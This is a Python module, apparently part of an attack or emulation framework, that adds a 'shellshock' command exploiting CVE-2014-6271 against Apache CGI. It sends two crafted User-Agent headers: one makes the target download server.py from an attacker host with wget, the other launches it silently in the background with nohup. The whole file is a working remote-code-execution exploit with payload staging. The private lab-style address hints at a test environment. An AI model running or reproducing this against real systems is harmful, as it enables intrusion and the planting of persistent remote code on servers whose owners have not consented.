from ..commands import Command
import requests

ATTACK_HOST = "192.168.56.101"
ATTACK_PORT = 8080
VENV_PYTHON = "/var/tmp/.venv/bin/python3"
SERVER_PATH = "/var/tmp/server.py"


def send_shellshock_payload(target: str) -> None:
    url = f"http://{target}/cgi-bin/shockme.cgi"

    wget_command = f"/usr/bin/wget -q http://{ATTACK_HOST}:{ATTACK_PORT}/server.py -O {SERVER_PATH}"
    python_command = f"/usr/bin/nohup {VENV_PYTHON} {SERVER_PATH} 0</dev/null 1>/dev/null 2>/dev/null &"

    session = requests.Session()
    session.headers.clear()

    try:
        session.get(url, headers={"User-Agent": f"() {{ :; }}; {wget_command}"}, timeout=5)
        print("[+] Wget payload sent.")
    except Exception:
        pass

    try:
        session.get(url, headers={"User-Agent": f"() {{ :; }}; {python_command}"}, timeout=5)
        print("[+] Launch payload sent.")
    except Exception:
        pass

    print("[+] Shellshock complete.")


class shellshock(Command):
    """
    Exploit Shellshock (CVE-2014-6271) on a target running vulnerable Apache CGI.
    Usage: shellshock <target>
    """
    def do_command(self, lines: str):
        parts = lines.split()
        if not parts:
            print("Usage: shellshock <target>")
            return
        send_shellshock_payload(parts[0])


command = shellshock